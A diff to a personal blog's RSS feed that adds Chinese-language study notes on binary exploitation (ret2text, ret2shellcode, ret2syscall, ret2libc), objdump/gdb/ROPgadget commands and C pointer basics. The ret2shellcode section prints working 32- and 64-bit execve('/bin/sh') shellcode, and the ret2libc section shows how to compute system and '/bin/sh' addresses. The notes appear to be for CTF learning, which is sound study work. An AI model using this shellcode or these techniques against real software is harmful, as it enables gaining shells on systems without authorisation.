@@ -5,17 +5,106 @@
         <link>http://wangboxuexilu.github.io</link>
         <description></description>
         <language>en</language>
-        <pubDate>Sun, 07 Mar 2021 15:22:19 +0800</pubDate>
-        <lastBuildDate>Sun, 07 Mar 2021 15:22:19 +0800</lastBuildDate>
+        <pubDate>Thu, 11 Mar 2021 19:42:42 +0800</pubDate>
+        <lastBuildDate>Thu, 11 Mar 2021 19:42:42 +0800</lastBuildDate>
+        <item>
+            <guid isPermalink="true">http://wangboxuexilu.github.io/2021/03/11/ret2%E7%B3%BB%E5%88%97/</guid>
+            <title>ret2系列</title>
+            <link>http://wangboxuexilu.github.io/2021/03/11/ret2%E7%B3%BB%E5%88%97/</link>
+            <pubDate>Thu, 11 Mar 2021 19:42:42 +0800</pubDate>
+            <description><![CDATA[ &lt;hr&gt;
+&lt;h2 id=&#34;1ret2text&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#1ret2text&#34;&gt;#&lt;/a&gt; 1.ret2text&lt;/h2&gt;
+&lt;p&gt;条件：程序中含有后门函数&lt;/p&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;2ret2shellcode&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#2ret2shellcode&#34;&gt;#&lt;/a&gt; 2.ret2shellcode&lt;/h2&gt;
+&lt;p&gt;条件：程序不开启 NX 保护&lt;/p&gt;
+&lt;p&gt;32 位 shellcode：&lt;/p&gt;
+&lt;p&gt;shellcode=asm(&amp;quot;&amp;quot;&amp;quot;&lt;/p&gt;
+&lt;p&gt;push 0x68  #h&lt;/p&gt;
+&lt;p&gt;push 0x732f2f2f   #s///&lt;/p&gt;
+&lt;p&gt;push 0x6e69622f   #nib/&lt;/p&gt;
+&lt;p&gt;mov ebx,esp  #将 /bin///sh 传入 ebx&lt;/p&gt;
+&lt;p&gt;xor ecx,ecx  #ecx 置零&lt;/p&gt;
+&lt;p&gt;xor edx,edx  #edx 置零&lt;/p&gt;
+&lt;p&gt;push 11&lt;/p&gt;
+&lt;p&gt;pop eax  #将 0xb 传入 eax&lt;/p&gt;
+&lt;p&gt;int 0x80  #系统调用号&lt;/p&gt;
+&lt;p&gt;“”&amp;quot;)&lt;/p&gt;
+&lt;p&gt;64 位 shellcode:&lt;/p&gt;
+&lt;p&gt;shellcode=asm(&amp;quot;&amp;quot;&amp;quot;&lt;/p&gt;
+&lt;p&gt;mov rbx,0x68732f6e69622f  #将 rbx 置为 &amp;quot;hs/nib/&amp;quot;&lt;/p&gt;
+&lt;p&gt;push rbx  #将 rbx 压入栈&lt;/p&gt;
+&lt;p&gt;push rsp  #将 &amp;quot;hs/nib/&amp;quot; 的地址压入栈&lt;/p&gt;
+&lt;p&gt;pop rdi  #将 rdi 设为 bin_sh_address&lt;/p&gt;
+&lt;p&gt;xor esi,esi  #将 rsi 低 32 位置零，高八位通常是零，且相比全部置零短一个字节&lt;/p&gt;
+&lt;p&gt;xor edx,edx  #将 rdx 低 32 位置零&lt;/p&gt;
+&lt;p&gt;push 0x3b&lt;/p&gt;
+&lt;p&gt;pop rax  #将 rax 设为 0x3b&lt;/p&gt;
+&lt;p&gt;syscall&lt;/p&gt;
+&lt;p&gt;“”&amp;quot;)&lt;/p&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;3ret2syscall&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#3ret2syscall&#34;&gt;#&lt;/a&gt; 3.ret2syscall&lt;/h2&gt;
+&lt;p&gt;可用来突破 NX 保护&lt;/p&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;4ret2libc&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#4ret2libc&#34;&gt;#&lt;/a&gt; 4.ret2libc&lt;/h2&gt;
+&lt;p&gt;条件：程序中必须要有 puts,write,printf 之类的输出函数&lt;/p&gt;
+&lt;p&gt;可突破 NX 保护&lt;/p&gt;
+&lt;p&gt;思路：利用溢出泄露出某一已经执行过的 libc 函数的真实地址，再通过此函数的真实地址与其在 libc 库 symbols 表中的偏移地址，即可计算出 libc 库函数的基址，从而可以计算出 libc 库中任意函数或变量的真实地址&lt;/p&gt;
+&lt;p&gt;libc_base=gets_real_address-libc.symbols[“gets”]&lt;/p&gt;
+&lt;p&gt;system_real_address=libc_base+libc.symbols[“system”]&lt;/p&gt;
+&lt;p&gt;bin_sh_address=libc_base+libc.search(&amp;quot;/bin/sh&amp;quot;)&lt;/p&gt;
+&lt;p&gt;例：&lt;img data-src=&#34;E:%5CDesktop%5CQQ%E6%88%AA%E5%9B%BE20210312193500.png&#34; alt=&#34;QQ截图20210312193500&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;E:%5CDesktop%5CQQ%E6%88%AA%E5%9B%BE20210312193531.png&#34; alt=&#34;QQ截图20210312193531&#34;&gt;&lt;/p&gt;
+ ]]></description>
+        </item>
+        <item>
+            <guid isPermalink="true">http://wangboxuexilu.github.io/2021/03/09/%E9%80%86%E5%90%91%E7%AC%94%E8%AE%B0/</guid>
+            <title>逆向笔记</title>
+            <link>http://wangboxuexilu.github.io/2021/03/09/%E9%80%86%E5%90%91%E7%AC%94%E8%AE%B0/</link>
+            <pubDate>Tue, 09 Mar 2021 17:23:24 +0800</pubDate>
+            <description><![CDATA[ &lt;hr&gt;
+&lt;h2 id=&#34;1查看汇编代码&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#1查看汇编代码&#34;&gt;#&lt;/a&gt; 1. 查看汇编代码&lt;/h2&gt;
+&lt;p&gt;objdump  -t  XXX : 查看程序中使用到的函数&lt;/p&gt;
+&lt;p&gt;objdump  -d  XXX  ：查看程序中函数的汇编代码&lt;/p&gt;
+&lt;p&gt;objdump  -d  -j  .plt  XXX : 查看 plt 表&lt;/p&gt;
+&lt;p&gt;-j 的参数有：.text - 代码段&lt;/p&gt;
+&lt;p&gt;​                       .const - 只读数据段（有些编译器不使用此段，将只读数据并入.data 段&lt;/p&gt;
+&lt;p&gt;​                        .data - 读写数据段&lt;/p&gt;
+&lt;p&gt;​                        .bss  -bss 段&lt;/p&gt;
+&lt;p&gt;objdump -d -M intel 程序名 |grep 函数名：查看某程序内某函数地址&lt;/p&gt;
+&lt;p&gt;objdump -d -j .plt ./filename |grep system : 查找程序中 plt 表中函数地址&lt;/p&gt;
+&lt;h2 id=&#34;2gdb调试&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#2gdb调试&#34;&gt;#&lt;/a&gt; 2.gdb 调试&lt;/h2&gt;
+&lt;p&gt;disass XXX : 查看某函数的反汇编&lt;/p&gt;
+&lt;p&gt;b  *(地址）在此地址下断点&lt;/p&gt;
+&lt;p&gt;set  *(地址）= 地址  改变某地址内容&lt;/p&gt;
+&lt;h2 id=&#34;3常见漏洞&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#3常见漏洞&#34;&gt;#&lt;/a&gt; 3. 常见漏洞&lt;/h2&gt;
+&lt;p&gt;1）格式化输出字符串漏洞&lt;/p&gt;
+&lt;p&gt;​      printf (“my name is % s”, 参数）&lt;/p&gt;
+&lt;p&gt;​      一般来说，printf ()&lt;/p&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;4ropgadget&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#4ropgadget&#34;&gt;#&lt;/a&gt; 4.ROPgadget&lt;/h2&gt;
+&lt;p&gt;ROPgadget -binary ./filename --only “pop|ret” |grep “eax”&lt;/p&gt;
+&lt;p&gt;查找 pop eax ;ret 代码片段&lt;/p&gt;
+&lt;p&gt;ROPgadget --binary ./filename --string “/bin/sh”&lt;/p&gt;
+&lt;p&gt;查找字符串 &amp;quot;/bin/sh&amp;quot; 地址&lt;/p&gt;
+ ]]></description>
+        </item>
         <item>
             <guid isPermalink="true">http://wangboxuexilu.github.io/2021/03/07/%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0/</guid>
             <title>我的第一篇文章</title>
             <link>http://wangboxuexilu.github.io/2021/03/07/%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0/</link>
             <pubDate>Sun, 07 Mar 2021 15:22:19 +0800</pubDate>
             <description><![CDATA[ &lt;hr&gt;
-&lt;h2 id=&#34;第一章&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#第一章&#34;&gt;#&lt;/a&gt; 第一章&lt;/h2&gt;
-&lt;p&gt;夜刀神十香&lt;/p&gt;
-&lt;p&gt;神奇的延迟？&lt;/p&gt;
+&lt;h2 id=&#34;1指针&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#1指针&#34;&gt;#&lt;/a&gt; 1. 指针&lt;/h2&gt;
+&lt;p&gt;特性：一种全新的类型，四字节宽度，可以进行 ++，–，+，-，&amp;lt;,&amp;gt; 运算&lt;/p&gt;
+&lt;p&gt;++：加上去掉一个星号之后的宽度大小&lt;/p&gt;
+&lt;p&gt;–：减去去掉一个星号的宽度大小&lt;/p&gt;
+&lt;p&gt;+：加上或减去一个整数时&lt;/p&gt;
+&lt;p&gt;​      带星类型变量 +（-）N = 带星类型变量 +（-）N 乘（去掉一个星后的类型宽度）&lt;/p&gt;
+&lt;p&gt;两个类型相同的带星类型的变量可以进行减法操作（相减的结果要除以去掉一个星后的数据宽度）&lt;/p&gt;
+&lt;p&gt;类型相同的带星类型可以做大小的比较&lt;/p&gt;
+&lt;p&gt;char* x=“china”#x 保存的是 &amp;quot;china&amp;quot; 的地址，&amp;quot;china&amp;quot; 本身存储在常量区，所以 *（x+1）=‘a’并不能将’h’修改为’a’，因为常量不可写&lt;/p&gt;
+&lt;p&gt;char y []=“china”#&amp;quot;china&amp;quot; 也保存在常量区，但 &amp;quot;china&amp;quot; 的拷贝会保存在栈中，所以可以对栈中的 &amp;quot;china&amp;quot; 进行操作&lt;/p&gt;
 &lt;hr&gt;
 &lt;h2 id=&#34;第二章&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#第二章&#34;&gt;#&lt;/a&gt; 第二章&lt;/h2&gt;
 &lt;p&gt;时崎狂三&lt;/p&gt;
